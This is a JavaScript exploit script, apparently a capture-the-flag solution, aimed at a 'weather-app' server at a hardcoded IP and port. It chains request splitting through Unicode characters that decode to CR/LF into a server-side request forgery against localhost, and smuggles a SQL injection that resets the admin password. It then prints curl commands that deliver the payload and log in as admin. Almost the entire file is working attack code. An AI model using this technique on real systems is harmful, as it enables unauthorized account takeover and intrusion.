/**
 * PASSWORD: what you want the new passord to be
 *
 * TARGET: server which is running `weather-app`
 */
const PASSWORD = "monkey123"
const TARGET = "http://161.35.173.232:30771"

async function makeRequest() {
    const baseUrl = "127.0.0.1/";
    /**
     * Do not use template strings breaks something
     *
     * Could be any unicode non-latin char, that ends in the last 2 digits which match space, \r and \n
     * Buffer.from('http://example.com/\u{010D}\u{010A}/test', 'latin1').toString()
     */
    const s = "\u0120"; // s is space
    const r = "\u010D"; // \r
    const n = "\u010A"; // \n
    const sic = "%27"; //singleInvertedConverted
    const dic = "%22"; //double inverted comma
    let username = 'admin';
    let password = PASSWORD + sic + ")" + s + "ON" + s + "CONFLICT" + s + "(username)" + s + "DO" + s + "UPDATE" + s +
        "SET" + s + "password" + s + "=" + "excluded.password;"

    const payload = "username=" + username + "&password=" + password
    const rn = r + n;
    const httpTag = "HTTP/1.1";
    const hostHeader = "Host:" + s + "127.0.0.1";
    const postReqTag = "POST" + s + "/register";
    const contentTypeHeader = "Content-Type:" + s + "application/x-www-form-urlencoded"
    const contentLengthHeader = "Content-Length:" + s + payload.length;
    const payloadUrl = baseUrl + s + httpTag + rn + hostHeader + rn + rn + postReqTag + s + httpTag + rn + hostHeader +
        rn + contentTypeHeader + rn + contentLengthHeader + rn + rn + payload + rn + rn + "GET" + s;
    const postRequestPayload = JSON.stringify({ endpoint: payloadUrl, city: "Toronto", country: "CA" });

    console.log(`curl ${TARGET}/api/weather -X POST -H "Content-Type: application/json" --data "${postRequestPayload.replaceAll("\"", "\\\"")}"`);
    console.log("\n\nand then...\n\n")
    console.log(`curl ${TARGET}/login -X POST -H "Content-Type: application/x-www-form-urlencoded" --data "username=admin&password=${PASSWORD}"`)
}

makeRequest();
